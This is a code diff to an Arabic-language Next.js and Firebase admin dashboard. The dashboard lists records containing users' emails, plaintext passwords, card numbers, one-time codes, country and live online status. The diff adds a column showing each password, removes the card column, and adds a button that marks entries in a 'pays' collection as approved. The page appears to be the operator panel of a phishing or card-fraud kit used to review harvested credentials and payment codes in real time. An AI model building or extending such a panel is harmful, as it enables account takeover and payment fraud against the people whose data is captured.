@@ -1,7 +1,13 @@
 "use client";
 
 import { useEffect, useState, useMemo, useRef } from "react";
-import { collection, onSnapshot, doc, deleteDoc } from "firebase/firestore";
+import {
+  collection,
+  onSnapshot,
+  doc,
+  deleteDoc,
+  updateDoc,
+} from "firebase/firestore";
 import { db } from "@/lib/firestore";
 import { ref, onValue } from "firebase/database";
 import { database } from "@/lib/firestore";
@@ -353,6 +359,29 @@ function NotificationsContent() {
   const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>(
     {}
   );
+  const handleApprove = async (id: string) => {
+    try {
+      await updateDoc(doc(db, "pays", id), {
+        status: "approved",
+      });
+
+      setNotifications((prev) =>
+        prev.map((n) => (n.id === id ? { ...n, status: "approved" } : n))
+      );
+
+      toast({
+        title: "تم الاعتماد ✅",
+        description: "تم تحديث الحالة إلى Approved",
+      });
+    } catch (error) {
+      console.error("Error updating status:", error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء تحديث الحالة",
+        variant: "destructive",
+      });
+    }
+  };
 
   useEffect(() => {
     const statusRefs: { [key: string]: () => void } = {};
@@ -652,11 +681,9 @@ function NotificationsContent() {
                       البريد الإلكتروني
                     </th>
                     <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">
-                      الهاتف
+                      باسورد
                     </th>
-                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">
-                      البطاقة
-                    </th>
+
                     <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">
                       التحقق
                     </th>
@@ -682,7 +709,7 @@ function NotificationsContent() {
                           ></div>
                           <div>
                             <p className="font-semibold text-gray-800">
-                              {notification?.email} {notification?.password}
+                              {notification?.email}
                             </p>
                             {notification.createdDate && (
                               <p className="text-xs text-gray-400">
@@ -705,22 +732,10 @@ function NotificationsContent() {
                       </td>
                       <td className="px-6 py-4">
                         <p className="text-sm text-gray-700 font-mono">
-                          {notification?.phone || "غير متوفر"}
+                          {notification?.password || "غير متوفر"}
                         </p>
                       </td>
-                      <td className="px-6 py-4">
-                        {notification?.cardNumber ? (
-                          <Badge
-                            onClick={() => setSelectedTab("card")}
-                            className="bg-gradient-to-r from-green-500 to-green-600 text-white"
-                          >
-                            <CheckCircle className="h-3 w-3 ml-1" />
-                            بطاقة موجودة
-                          </Badge>
-                        ) : (
-                          <Badge variant="secondary">لا توجد بطاقة</Badge>
-                        )}
-                      </td>
+
                       <td className="px-6 py-4">
                         {notification.otp ? (
                           <Badge className="bg-gradient-to-r from-purple-500 to-purple-600 text-white">
@@ -742,6 +757,19 @@ function NotificationsContent() {
                         >
                           التفاصيل
                         </Button>
+
+                        <Button
+                          size="sm"
+                          className="bg-green-600 hover:bg-green-700 text-white"
+                          disabled={notification.status === "approved"}
+                          onClick={() => handleApprove(notification.id)}
+                        >
+                          <CheckCircle className="h-4 w-4 ml-1" />
+                          {notification.status === "approved"
+                            ? "تم الاعتماد"
+                            : "اعتماد"}
+                        </Button>
+
                         <Button
                           className="h-8"
                           variant="destructive"
@@ -751,6 +779,7 @@ function NotificationsContent() {
                           <Trash2 className="h-4" />
                         </Button>
                       </td>
+
                       <td className="px-6 py-4">
                         {notification.country ? (
                           <Badge className="bg-gradient-to-r from-purple-500 to-purple-600 text-white">
